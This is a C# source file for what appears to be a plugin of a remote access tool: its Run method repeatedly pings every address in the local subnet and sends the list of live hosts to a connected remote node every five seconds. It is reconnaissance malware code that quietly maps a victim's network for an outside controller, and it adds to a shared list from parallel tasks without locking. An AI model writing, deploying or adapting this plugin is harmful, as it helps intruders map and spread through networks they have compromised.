using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Plugin
{
    public class Main
    {
        private async Task<List<string>> ScanNetworkAsync()
        {
            List<string> activeDevices = new List<string>();
            string localIP = GetLocalIPAddress();

            if (string.IsNullOrEmpty(localIP))
                return activeDevices;

            string baseIP = localIP.Substring(0, localIP.LastIndexOf('.') + 1);

            // Parallel scanning of the network
            List<Task> tasks = new List<Task>();
            for (int i = 1; i < 255; i++)
            {
                string ip = baseIP + i;
                tasks.Add(Task.Run(() =>
                {
                    if (PingHost(ip))
                        activeDevices.Add(ip);
                }));
            }

            await Task.WhenAll(tasks);
            return activeDevices;
        }

        private bool PingHost(string ip)
        {
            try
            {
                using (Ping ping = new Ping())
                {
                    PingReply reply = ping.Send(ip, 100); // Timeout 100ms
                    return reply != null && reply.Status == IPStatus.Success;
                }
            }
            catch
            {
                return false;
            }
        }

        private string GetLocalIPAddress()
        {
            foreach (var networkInterface in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (networkInterface.OperationalStatus == OperationalStatus.Up &&
                    networkInterface.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                {
                    foreach (var address in networkInterface.GetIPProperties().UnicastAddresses)
                    {
                        if (address.Address.AddressFamily == AddressFamily.InterNetwork)
                            return address.Address.ToString();
                    }
                }
            }
            return null;
        }

        public async Task Run(Node node)
        {
            while (node.Connected())
            {
                List<string> devices = await ScanNetworkAsync();
                StringBuilder result = new StringBuilder();

                foreach (var device in devices)
                    result.AppendLine(device);

                byte[] data = Encoding.UTF8.GetBytes(result.ToString());
                await node.SendAsync(data);

                await Task.Delay(5000); // Wait 5 seconds before rescanning
            }
        }
    }
}
